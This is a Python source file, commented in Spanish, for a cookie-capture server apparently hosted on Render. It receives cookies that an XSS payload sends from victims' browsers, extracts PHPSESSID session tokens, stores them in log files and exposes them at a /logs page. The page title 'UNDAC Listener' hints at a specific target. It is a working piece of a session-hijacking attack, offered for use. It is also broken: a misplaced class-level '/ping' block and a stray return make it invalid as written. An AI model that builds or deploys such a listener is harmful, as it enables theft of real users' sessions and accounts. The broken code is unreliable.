from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import os
from datetime import datetime
import sys
import json

# Render asigna el puerto dinámico en la variable PORT
PORT = int(os.environ.get("PORT", 8000))

class RequestHandler(BaseHTTPRequestHandler):

    if parsed_path.path == "/ping":
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"pong")
    return

    def do_GET(self):
        # Parseamos la URL y los parámetros
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Capturar el parámetro 'c' que contiene las cookies
        c_value = query.get('c', [''])[0]
        
        # ========== NUEVA FUNCIONALIDAD AÑADIDA ==========
        # Registrar TODAS las peticiones para debugging
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'path': self.path,
            'headers': dict(self.headers),
            'c_value_raw': c_value
        }
        
        print(f"\n{'='*80}", file=sys.stderr, flush=True)
        print(f"[{datetime.now()}] 📥 Peticion recibida:", file=sys.stderr, flush=True)
        print(f"📎 Path: {self.path}", file=sys.stderr, flush=True)
        
        # Si hay parámetro 'c', procesamos las cookies
        if c_value:
            # Decodificar manualmente por si acaso (parse_qs ya lo hace, pero por seguridad)
            from urllib.parse import unquote
            decoded_cookies = unquote(c_value)
            
            print(f"🍪 Cookie recibida (decodificada): {decoded_cookies[:200]}...", file=sys.stderr, flush=True)
            
            # Guardar en archivo de cookies específico
            try:
                with open('cookies_captured.log', 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"🕒 Fecha: {datetime.now()}\n")
                    f.write(f"🌐 URL completa: {self.path}\n")
                    f.write(f"🔐 Cookie completa: {decoded_cookies}\n")
                    
                    # Buscar PHPSESSID específicamente
                    if 'PHPSESSID' in decoded_cookies:
                        # Método mejorado para extraer PHPSESSID
                        for part in decoded_cookies.split(';'):
                            part = part.strip()
                            if part.startswith('PHPSESSID='):
                                phpsessid = part[10:]  # Remover "PHPSESSID="
                                f.write(f"✅ PHPSESSID extraida: {phpsessid}\n")
                                print(f"✅ PHPSESSID encontrada: {phpsessid}", file=sys.stderr, flush=True)
                                
                                # Guardar también en archivo separado (compatible con tu versión)
                                with open('phpsessid.txt', 'a', encoding='utf-8') as pf:
                                    pf.write(f"{datetime.now()} - {phpsessid}\n")
                                break
                    else:
                        f.write("⚠️  No se encontro PHPSESSID\n")
                        print("⚠️  No se encontro PHPSESSID en la cookie", file=sys.stderr, flush=True)
            except Exception as e:
                print(f"❌ Error escribiendo archivo: {e}", file=sys.stderr, flush=True)
        
        # ========== TU FUNCIÓN ORIGINAL (preservada) ==========
        if c_value:
            # Mostrar en logs (Render verá esto)
            print(f"\n{'='*60}", file=sys.stderr, flush=True)
            print(f"[{datetime.now()}] COOKIE CAPTURADA!", file=sys.stderr, flush=True)
            print(f"URL completa: {self.path}", file=sys.stderr, flush=True)
            print(f"Contenido: {c_value}", file=sys.stderr, flush=True)
            
            # Extraer PHPSESSID específicamente (tu código original)
            if 'PHPSESSID' in c_value:
                # Buscar PHPSESSID=valor;
                start = c_value.find('PHPSESSID=') + 10  # 10 = len('PHPSESSID=')
                end = c_value.find(';', start)
                if end == -1:
                    end = len(c_value)
                phpsessid = c_value[start:end]
                
                print(f"[+] PHPSESSID extraida: {phpsessid}", file=sys.stderr, flush=True)
                
                # Guardar solo PHPSESSID en archivo (para uso rápido)
                try:
                    with open('phpsessid.txt', 'a') as f:
                        f.write(f"{datetime.now()} - {phpsessid}\n")
                except:
                    pass
            else:
                print("[-] No se encontro PHPSESSID", file=sys.stderr, flush=True)
        else:
            print(f"[?] Peticion recibida sin parametros: {self.path}", file=sys.stderr, flush=True)
        
        # ========== NUEVO: Endpoints adicionales ==========
        # Si es la raíz, mostrar página de estado
        if self.path == '/' or self.path == '/status':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = """
            <html>
            <head><title>UNDAC Listener</title></head>
            <body>
                <h1>✅ Servidor funcionando</h1>
                <p>Esperando cookies...</p>
                <p><a href="/logs">Ver logs recientes</a></p>
                <p><a href="/test">Probar captura</a></p>
            </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
            return
        
        # Endpoint para probar
        if self.path == '/test':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>Test OK</h1><p>Servidor funcionando correctamente</p>")
            print(f"✅ Test endpoint accedido", file=sys.stderr, flush=True)
            return
        
        # Endpoint para ver logs recientes
        if self.path == '/logs':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            try:
                with open('cookies_captured.log', 'r', encoding='utf-8') as f:
                    logs = f.read()[-5000:]  # últimos 5KB
                html = f"<html><body><h1>Ultimos logs</h1><pre>{logs}</pre></body></html>"
                self.wfile.write(html.encode('utf-8'))
            except:
                self.wfile.write(b"<h1>No hay logs aun</h1>")
            return
        
        # Respuesta simple para el payload XSS (evitar errores en navegador víctima)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")  # Para evitar CORS
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        # Silenciar logs de acceso HTTP normal, usamos stderr para debug
        pass

# Mensaje de inicio mejorado
print(f"\n{'='*80}", file=sys.stderr, flush=True)
print(f"🚀 Servidor iniciado en puerto {PORT}", file=sys.stderr, flush=True)
print(f"🌐 URL: https://listener-koyk.onrender.com", file=sys.stderr, flush=True)
print(f"🔍 Endpoint para cookies: https://listener-koyk.onrender.com/?c=TU_COOKIE", file=sys.stderr, flush=True)
print(f"📊 Estado: https://listener-koyk.onrender.com/status", file=sys.stderr, flush=True)
print(f"⏰ Hora: {datetime.now()}", file=sys.stderr, flush=True)
print(f"{'='*80}", file=sys.stderr, flush=True)

# Crear archivo de cookies si no existe
try:
    with open('cookies_captured.log', 'a', encoding='utf-8') as f:
        f.write(f"\n{'#'*80}\n")
        f.write(f"🔄 Servidor reiniciado: {datetime.now()}\n")
        f.write(f"{'#'*80}\n")
except:
    pass

with HTTPServer(("", PORT), RequestHandler) as httpd:
    print(f"📝 Esperando cookies...", file=sys.stderr, flush=True)
    httpd.serve_forever()